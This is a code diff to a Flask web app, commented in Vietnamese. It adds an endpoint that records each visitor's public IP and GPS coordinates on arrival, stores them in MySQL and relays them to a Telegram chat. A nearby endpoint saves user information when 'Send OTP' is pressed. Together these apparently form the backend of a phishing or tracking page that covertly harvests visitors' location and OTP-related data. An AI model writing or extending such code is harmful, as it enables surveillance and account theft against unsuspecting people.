@@ -52,8 +52,55 @@ def create_connection():
 def index():
     return render_template('index.html')
 
+# API để nhận và lưu thông tin IP và GPS khi người dùng vừa truy cập
+@app.route('/api/save-ip', methods=['POST'])
+def save_ip_info():
+    connection = None
+    try:
+        # Nhận dữ liệu từ request
+        data = request.json
+        ip_address = data.get('ip_address')
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
 
-# API để nhận và lưu thông tin người dùng
+        # Kết nối đến MySQL
+        connection = create_connection()
+        if not connection:
+            return jsonify({'message': 'Không thể kết nối đến cơ sở dữ liệu'}), 500
+
+        cursor = connection.cursor()
+
+        # Lưu thông tin IP và tọa độ vào database
+        insert_query = """
+            INSERT INTO ip_info (ip_address, latitude, longitude)
+            VALUES (%s, %s, %s)
+        """
+        cursor.execute(insert_query, (ip_address, latitude, longitude))
+        connection.commit()
+
+        cursor.close()
+        connection.close()
+
+        # Gửi tin nhắn đến Telegram
+        message = f"Thông tin mới: IP Public: {ip_address}, Vị trí: ({longitude}, {latitude})"
+        send_telegram_message(message)
+
+        # Trả về phản hồi JSON thành công
+        return jsonify({'message': 'Lưu thông tin thành công'}), 200
+
+    except Exception as e:
+        # Ghi chi tiết lỗi ra console để tiện theo dõi
+        print(f'Lỗi khi xử lý yêu cầu: {e}')
+
+        return jsonify({'message': 'Lỗi máy chủ', 'error': str(e)}), 500
+
+    finally:
+        # Đảm bảo đóng kết nối MySQL khi hoàn thành
+        if connection and connection.is_connected():
+            connection.close()
+
+
+# API để nhận và lưu thông tin người dùng khi nhấn "Gửi OTP"
 @app.route('/api/save-user-info', methods=['POST'])
 def save_user_info():
     connection = None
